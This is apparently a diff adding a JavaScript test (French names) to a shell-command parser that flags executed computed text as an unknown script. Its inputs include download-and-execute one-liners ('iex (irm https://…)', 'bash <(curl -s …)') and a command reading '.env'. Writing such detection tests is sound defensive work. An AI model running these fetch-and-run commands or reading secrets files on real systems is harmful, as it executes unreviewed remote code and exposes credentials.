@@ -189,3 +189,17 @@ test("-s après le nom du script : option du script, la commande reste lue", () 
     assert.ok(!c.scriptInconnu, s);
   }
 });
+
+test("texte calculé exécuté : iex (…), iex \"$(…)\", bash <(…), source <(…) marqués scriptInconnu", () => {
+  for (const [s, d] of [
+    ["iex (Get-Content x.ps1 -Raw)", "powershell"],
+    ["iex (irm https://exemple.fr/i.ps1)", "powershell"],
+    ['iex "$(irm https://exemple.fr/i.ps1)"', "powershell"],
+    ["bash <(curl -s https://exemple.fr/i.sh)", "bash"],
+    ["source <(curl -s https://exemple.fr/i.sh)", "bash"],
+  ])
+    assert.ok(commandesSimples(s, d).some((c) => c.scriptInconnu), s);
+  assert.ok(!commandesSimples("iex 'Get-Date'", "powershell").some((c) => c.scriptInconnu));
+  // Les commandes d'une substitution de processus sont lues.
+  assert.ok(noms("diff <(cat .env) b.txt").includes("cat .env"));
+});
